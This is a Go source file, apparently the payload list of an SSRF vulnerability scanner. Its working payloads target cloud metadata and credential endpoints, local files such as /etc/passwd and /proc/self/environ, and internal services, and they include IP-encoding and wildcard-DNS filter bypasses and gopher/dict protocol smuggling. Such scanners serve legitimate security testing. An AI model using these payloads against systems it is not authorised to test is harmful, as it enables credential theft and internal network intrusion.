package ssrfengine

import "fmt"

// SSRFPayload pairs a candidate URL/protocol payload with the signature
// expected in the response if the server actually fetched it.
type SSRFPayload struct {
	URL  string
	Sig  string
	Desc string
	CVSS float64
}

// Params is the SSRF-sensitive parameter name list probed on every request.
var Params = []string{
	"url", "uri", "link", "dest", "redirect", "src", "source", "file",
	"u", "r", "document", "path", "pg", "view", "callback", "image_url",
	"webhook", "endpoint", "proxy", "target", "host", "to", "forward",
	"return", "fetch", "load", "open", "read", "data",
}

// CloudPayloads target cloud-provider instance metadata endpoints.
var CloudPayloads = []SSRFPayload{
	{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS EC2 Metadata (Standard)", 10.0},
	{"http://169.254.169.254/latest/user-data/", "#!/bin/bash", "AWS User-Data (Script)", 10.0},
	{"http://169.254.170.2/v2/credentials/", "AccessKeyId", "AWS ECS Task Credentials", 10.0},
	{"http://metadata.google.internal/computeMetadata/v1/", "Metadata-Flavor", "GCP Metadata (Header Leak)", 9.5},
	{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Required HTTP header", "Azure Metadata (Header Leak)", 9.5},
	{"http://100.100.100.200/latest/meta-data/", "image-id", "Alibaba Cloud Metadata", 9.0},
	{"http://169.254.169.254/metadata/v1/", "droplet_id", "DigitalOcean Metadata", 9.0},
	{"http://192.0.0.192/latest/", "oracle", "Oracle Cloud Metadata", 9.0},
}

// LocalhostBypass are alternative IP encodings of 127.0.0.1 meant to evade
// naive string-based localhost filters.
var LocalhostBypass = []SSRFPayload{
	{"http://0x7f000001/", "localhost_marker", "Hex IP (127.0.0.1 → 0x7f000001)", 9.5},
	{"http://0177.0000.0000.0001/", "localhost_marker", "Octal IP (127.0.0.1 octal)", 9.5},
	{"http://2130706433/", "localhost_marker", "Decimal IP (127.0.0.1 → 2130706433)", 9.5},
	{"http://[::1]/", "localhost_marker", "IPv6 Localhost ([::1])", 9.5},
	{"http://[::ffff:127.0.0.1]/", "localhost_marker", "IPv4-Mapped IPv6 ([::ffff:127.0.0.1])", 9.5},
	{"http://[::]/", "localhost_marker", "IPv6 Zero ([::] — 0.0.0.0)", 9.0},
	{"http://0/", "localhost_marker", "Zero IP (0 — Linux'ta loopback)", 9.0},
	{"http://127%252e0%252e0%252e1/", "localhost_marker", "Double URL Encoded Dot Bypass", 9.0},
}

// AWSBypass are alternative encodings of the AWS metadata IP
// (169.254.169.254) meant to evade naive string-based filters.
var AWSBypass = []SSRFPayload{
	{"http://0xA9FEA9FE/", "ami-id", "AWS Metadata (Hex IP)", 10.0},
	{"http://2852039166/", "ami-id", "AWS Metadata (Decimal IP)", 10.0},
	{"http://0251.0376.0251.0376/latest/meta-data/", "ami-id", "AWS Metadata (Octal IP)", 10.0},
	{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "ami-id", "AWS Metadata (IPv6-Mapped)", 10.0},
}

// DNSBypass rebinds attacker-controlled hostnames to internal/metadata IPs
// via public wildcard-DNS services.
var DNSBypass = []SSRFPayload{
	{"http://127.0.0.1.nip.io/", "localhost_marker", "DNS Rebinding via nip.io (127.0.0.1)", 9.5},
	{"http://127.0.0.1.xip.io/", "localhost_marker", "DNS Rebinding via xip.io (127.0.0.1)", 9.5},
	{"http://127-0-0-1.sslip.io/", "localhost_marker", "DNS Rebinding via sslip.io", 9.5},
	{"http://169.254.169.254.nip.io/latest/meta-data/", "ami-id", "AWS Metadata via nip.io DNS", 10.0},
	{"http://169.254.169.254.xip.io/latest/meta-data/", "ami-id", "AWS Metadata via xip.io DNS", 10.0},
}

// FilePayloads probe the file:// scheme for local file inclusion via SSRF.
var FilePayloads = []SSRFPayload{
	{"file:///etc/passwd", "root:x:0:0", "Local File Inclusion (Linux /etc/passwd)", 9.0},
	{"file://C:/Windows/win.ini", "[fonts]", "Local File Inclusion (Windows win.ini)", 9.0},
	{"file:///proc/self/environ", "PATH=", "LFI via /proc/self/environ", 8.5},
}

// internalServices are common backing services probed on 127.0.0.1.
var internalServices = []struct {
	Port int
	Sig  string
	Desc string
}{
	{6379, "PONG", "Redis"},
	{9200, "\"version\"", "Elasticsearch"},
	{5432, "PostgreSQL", "PostgreSQL"},
	{3306, "mysql", "MySQL"},
	{8500, "consul", "Consul"},
	{2375, "\"ApiVersion\"", "Docker API"},
	{2379, "\"cluster_id\"", "etcd"},
	{8080, "Server", "Internal HTTP (8080)"},
}

// InternalPayloads is InternalServices rendered as probeable SSRFPayloads.
var InternalPayloads = buildInternalPayloads()

func buildInternalPayloads() []SSRFPayload {
	payloads := make([]SSRFPayload, 0, len(internalServices))
	for _, svc := range internalServices {
		payloads = append(payloads, SSRFPayload{
			URL:  fmt.Sprintf("http://127.0.0.1:%d/", svc.Port),
			Sig:  svc.Sig,
			Desc: fmt.Sprintf("Internal Service Probe: %s (127.0.0.1:%d)", svc.Desc, svc.Port),
			CVSS: 9.0,
		})
	}
	return payloads
}

// GopherPayloads use the gopher:// and dict:// schemes to smuggle raw
// protocol traffic to internal services (protocol smuggling SSRF).
var GopherPayloads = []SSRFPayload{
	{
		"gopher://127.0.0.1:6379/_PING%0d%0a",
		"+PONG",
		"Gopher Protocol → Redis PING (Internal Service Pivot)",
		9.5,
	},
	{
		"gopher://127.0.0.1:25/_HELO%20dorm%0d%0a",
		"220",
		"Gopher Protocol → SMTP HELO (Internal Mail Server Pivot)",
		9.0,
	},
	{
		"dict://127.0.0.1:6379/info",
		"redis_version",
		"Dict Protocol → Redis Info Leak",
		9.0,
	},
}
